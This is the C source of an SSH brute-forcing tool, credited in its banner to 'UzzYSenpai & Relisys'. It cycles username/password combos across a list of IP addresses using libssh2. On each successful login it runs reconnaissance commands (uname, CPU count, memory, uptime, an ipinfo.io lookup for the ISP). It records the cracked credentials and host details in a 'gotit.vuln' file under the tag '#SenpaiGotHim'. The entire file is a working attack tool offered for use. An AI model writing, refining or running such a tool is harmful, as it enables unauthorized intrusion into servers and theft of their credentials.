#include <sys/wait.h>
#include <time.h>
#include <getopt.h>
#include <sys/types.h>
#include <signal.h>
#include <netdb.h>
#include <math.h>
#define LIBSSH2_STATIC 1
#include <libssh2.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#ifndef LIBSSH2_CONFIG_H
#ifdef __VMS
#define LIBSSH2_CONFIG_H
#define ssize_t SSIZE_T
typedef unsigned int uint32_t ;
typedef unsigned int socklen_t;
#define HAVE_UNISTD_H
#define HAVE_STDLIB_H
#define HAVE_INTTYPES_H
#define HAVE_SYS_TIME_H
#define HAVE_SELECT
#define HAVE_UIO
#define HAVE_SYS_SOCKET.H
#define HAVE_NETINET_IN_H
#define HAVE_ARPA_INET_H
#define HAVE_GETTIMEOFDAY 1
#define POSIX_C_SOURCE
#define LIBSSH2DEBUG 1
#define HAVE_FIONBIO
#include <stropts.h>
#ifdef SO_STATE
#define SS_NBIO         0x100 
#endif
#define LIBSSH2_OPENSSL 1
#define LIBSSH2_HAVE_ZLIB
#define LIBSSH2_DH_GEX_NEW 1
#endif /* __VMS */
#endif /* LIBSSH2_CONFIG_H */
#define FAKE "/usr/sbin/sshd"
#include <stdlib.h>
#include <pthread.h>

int libssh2_session_block_directions(LIBSSH2_SESSION *session);
static int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{
    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    FD_ZERO(&fd);
    FD_SET(socket_fd, &fd);
    dir = libssh2_session_block_directions(session);
    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;
    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;
    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
    return rc;
}


int timeout_sec = 10;
int maxchilds = 20;
int sockfd;
int reverse_lookup = 0;

void timeout(int s)
{
	close(sockfd);
}

int checkRoot(char *username,char *password,char *hostname, int portar)
{
	FILE* vulnf;
	FILE* fp;
	fp=fopen(".log.ssh","a");
	fprintf(fp,"Am testat -> %s@%s %s\n",username,hostname,password);
	fclose(fp);
	const char *commandline = "uname -v && grep -c ^processor /proc/cpuinfo && uptime && free -h | grep 'Mem:' | awk  '{print $2}' && free -h | grep 'Mem:' | awk  '{print $3}' && free -h | grep 'Mem:' | awk  '{print $4}' && curl -s ipinfo.io/org --connect-timeout 10 -m 10 ";
	unsigned long hostaddr;
    int sock;
	int flag;
	int var;
	char warn[125]="";
	char banner[5000];
    struct sockaddr_in sin;
    const char *fingerprint;
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    int rc;
    int exitcode;
    char *exitsignal = (char *)"none";
    int bytecount = 0;
    size_t len;
    LIBSSH2_KNOWNHOSTS *nh;
    int type;
	#ifdef WIN32
		WSADATA wsadata;
		int err;
		err = WSAStartup(MAKEWORD(2, 0), &wsadata);
		if(err != 0) {
			fprintf(stderr, "WSAStartup failed with error: %d\n", err);
			return 1;
		}
	#endif
	rc = libssh2_init(0);
    if(rc != 0) {
        fprintf(stderr, "libssh2 initialization failed (%d)\n", rc);
        return 1;
    }
	struct sockaddr_in addr;

	addr.sin_family=AF_INET;
  addr.sin_port=htons(portar);
  addr.sin_addr.s_addr = inet_addr(hostname);
 

  if ((sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
		(void) alarm(0);
		exit(EXIT_FAILURE);
	}
	
	(void) signal(SIGALRM, &timeout); 
	(void) alarm(timeout_sec);

	if (connect(sockfd,(struct sockaddr *)&addr,sizeof(addr)) < 0) { 
		(void) alarm(0);
		 exit(EXIT_FAILURE);
	} 

	if (portar == 80)
    write(sockfd, "GET / HTTP/1.0\r\n\r\n", 19);

  (void) read(sockfd, banner, sizeof(banner));
 
	hostaddr = inet_addr(hostname);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	sin.sin_family = AF_INET;
    sin.sin_port = htons(portar);
    sin.sin_addr.s_addr = hostaddr;
    if(connect(sock, (struct sockaddr*)(&sin),
                sizeof(struct sockaddr_in)) != 0) {
        return -1;
    }
	session = libssh2_session_init();
    if(!session)
        return -1;
	while ((rc = libssh2_session_handshake(session, sock)) == LIBSSH2_ERROR_EAGAIN);
	if (rc) {
        return -1;
    }
	while ((rc = libssh2_userauth_password(session, username, password)) == LIBSSH2_ERROR_EAGAIN);
    if (rc) {
        goto shutdown;
    }
	  while( (channel = libssh2_channel_open_session(session)) == NULL &&
           libssh2_session_last_error(session,NULL,NULL,0) ==
           LIBSSH2_ERROR_EAGAIN )
		{
			waitsocket(sock, session);
		}
	 if( channel == NULL )
    {
        goto shutdown;
    }
	while( (rc = libssh2_channel_exec(channel, commandline)) ==
           LIBSSH2_ERROR_EAGAIN )
    {
        waitsocket(sock, session);
    }
	if( rc != 0 )
    {
        goto shutdown;
    }
	    for( ;; )
    {
        int rc;
        do
        {
    char uname[65535];
    rc = libssh2_channel_read( channel, uname, sizeof(uname) );
	char cores[65535];
    rc = libssh2_channel_read( channel, cores, sizeof(cores) );
    char uptime[65535];
    rc = libssh2_channel_read( channel, uptime, sizeof(uptime) );
	char ramt[65535];
    rc = libssh2_channel_read( channel, ramt, sizeof(ramt) );
	char ramu[65535];
    rc = libssh2_channel_read( channel, ramu, sizeof(ramu) );
	char ramf[65535];
    rc = libssh2_channel_read( channel, ramf, sizeof(ramf) );
	char isphost[65535];
    rc = libssh2_channel_read( channel, isphost, sizeof(isphost) );
			
            if( rc > 0 )
            {
                int i;
                bytecount += rc;
                hostname = strtok (hostname, "\n");
				vulnf=fopen("gotit.vuln","a+");
					fprintf(vulnf, "+------------------------------------------------------------------------------------------------------------------------------------+\n");
					fprintf(vulnf, " [+] #SenpaiGotHim - %s@%s Pass: %s \n", username,hostname,password);
					fprintf(vulnf," [ Info ] Port - %d \n", portar);
					fprintf(vulnf," [ Info ] Uname - %s ", uname);
					fprintf(vulnf,"[ Info ] Cores Proc - %s ", cores);
					fprintf(vulnf,"[ Info ] Uptime -%s ", uptime);
					fprintf(vulnf,"[ Info ] Ram - Total: %s", ramt);
					fprintf(vulnf," [ Info ] Ram - Used: %s", ramu);
					fprintf(vulnf," [ Info ] Ram - Free: %s", ramf);
					fprintf(vulnf," [ Info ] Banner - %s", banner);
					fprintf(vulnf," [ Info ] ISP - %s", isphost);
					fprintf(vulnf, "+------------------------------------------------------------------------------------------------------------------------------------+\n");
					
				fprintf(stderr, "\n\033[0;37m[\033[0;31m+\033[0;37m] \033[0;35m#SenpaiGotHim \033[0;37m- \033[0;33m%s\033[0;37m@\033[0;33m%s \033[0;37mPass: \033[0;33m%s \n", username,hostname,password);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mPort - \033[0;33m%d\n", portar);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mUname - \033[0;33m%s", uname);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mCores Proc - \033[0;33m%s", cores);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mUptime -\033[0;33m%s", uptime);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mRam - Total: \033[0;33m%s", ramt);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mRam - Used: \033[0;33m%s", ramu);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mRam - Free: \033[0;33m%s", ramf);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mBanner - \033[0;33m%s", banner);
				fprintf(stderr, "\033[0;31m[\033[0;37mInfo\033[0;31m] \033[0;37mISP - \033[0;33m%s", isphost);
				fclose(vulnf);
                goto shutdown;
                for( i=0; i < rc; ++i )
                var = i;
            }
            else {
                if( rc != LIBSSH2_ERROR_EAGAIN )
                    goto shutdown;
            }
        }
        while( rc > 0 );
        if( rc == LIBSSH2_ERROR_EAGAIN )
        {
            waitsocket(sock, session);
        }
        else
            break;
    }
	shutdown:
	
    libssh2_session_disconnect(session, "Normal Shutdown, Thank you for playing");
    libssh2_session_free(session);
#ifdef WIN32
    closesocket(sock);
#else
    close(sock);
#endif
    var = var;
    libssh2_exit();
    return 0;
}


char *iplist;
int port;

struct thr{
	char username[100];	
	char password[100];	
};
pthread_mutex_t lock;

void do_process(void *th)
{
    pthread_mutex_lock(&lock);
	FILE *ip;
	char *c;
	char buff[65535];
	char *a[80196], nutt[65535], *temp, *t, *string;
	struct thr  *val = (struct thr *) th;
	printf("\n\033[0;31m[\033[0;36m+\033[0;31m] \033[0;37mCombo: \033[0;33m%s:%s \033[0;35m#GetThemSenpai\033[0m\n",val->username,val->password);
	if((ip=fopen(iplist,"r")) == NULL)
	{ 
		printf("\n\033[0;31m[\033[0;37m-\033[0;31m] - \033[0;37mFATAL: Nu gasesc %s\n",iplist);
		return(0);
	}
	else
	{
	while(fgets(buff,sizeof(buff),ip))
		{	
			c=strchr(buff,' ');
			if(c!=NULL) c=" ";
				checkRoot(val->username,val->password,buff,port);
		}
	}
    printf("...Done\n");
    pthread_mutex_unlock(&lock);
}


int main(int argc,char *argv[])
{	
	char clean[50];
	strcpy( clean, "clear" );
	system(clean);
	printf("\n    \033[0m\033[2;49;35m╔═════════════════════════════════════════════════╗	\n");
	printf("    \033[0m\033[2;49;35m║	\033[0m\033[2;49;90m╔══ ╔══ ╔╗╔ ╔═╗ ╔═╗ ═╔═ ╔══ ╔═╗ ╔ ╗ ╔═╗ ╔═╗   \033[0m\033[2;49;35m║	\n");
	printf("    \033[0m\033[2;49;35m║	\033[0m\033[1;49;34m╚═╗ ║══ ║║║ ╔═╝ ║═║  ║  ╚═╗ ║ ║ ║ ║ ║═║ ║ ║   \033[0m\033[2;49;35m║	\n");
	printf("    \033[0m\033[2;49;35m║	\033[0m\033[0;37m╚═╝ ╚══ ╝╚╝ ╝   ╝ ╚ ═╝═ ╚═╝ ╚═╚ ╚═╝ ╝ ╚ ╚═╝   \033[0m\033[2;49;35m║	\n");
	printf("    \033[0m\033[2;49;35m╚══╗═══════════════════════════════════════════╔══╝	\n");
	printf("       \033[0m\033[2;49;35m╚═╗ \033[0m\033[1;49;96m12 01 2020 \033[0m\033[2;49;35m═ \033[0m\033[1;49;96mBy..UzzYSenpai & Relisys \033[0m\033[2;49;35m╔═╝	\n");
	printf("    	 \033[0m\033[2;49;35m╚═══════════════════════════════════════╝		\033[0m\n");
	char *passfile;
	int maxf,numforks,count = 0, i,j,countsave;
	FILE* passf;
	FILE* ip;
	char *c;
	char buff[65535];
	char *a[80196], nutt[65535], *temp, *t, *string;
	char *lastUser,*curpass;
	int status;
	if (argv[1] && argv[2] && argv[3] && argv[4] )
	{
		maxf = atoi(argv[1]);
		iplist = argv[2];
		passfile = argv[3];
		port = atoi(argv[4]);
		
		if((passf=fopen(passfile,"r")) == NULL)
		{ 
			printf("\n\033[0;31m[\033[0;37m-\033[0;31m] - \033[0;37mFATAL: Nu gasesc %s\n",passfile);
			return(0);
		}
		else
		{
				  while (fgets(nutt,2024,passf))
				  {
					    while (t = strchr (nutt,' '))
						{
							  temp = strtok (nutt, " ");
							  string = strdup (temp);
							  a[count++]=string;
							  while (temp = strtok (NULL, "\n"))
							   {
								   string = strdup (temp);
								   a[count++]=string;
							   }
						}
				  }
				  fclose(passf);
				  struct thr thrs[10000];
				  pthread_t p1[10000];
				  if (pthread_mutex_init(&lock, NULL) != 0)
					{
						printf("Mutex initialization failed.\n");
						return 1;
					}
					for (i=0; i<count; i=i+2)
					{
						strcpy(thrs[i].username,a[i]);
						strcpy(thrs[i].password,a[i+1]);
						pthread_create(&p1[i], NULL, do_process, &thrs[i]);
						}
					
					for (i=0; i<count; i=i+2)
					{
						pthread_join(p1[i], NULL);
						}
				  
		}
	}
	else
		 printf("\n\033[0;31m[\033[0;37m-\033[0;31m] - \033[0;37m Syntax: %s Thread-uri Iplist Passfile Port[22]\n",argv[0]);
         exit (0);
         exit (1);
		 return(0);
}


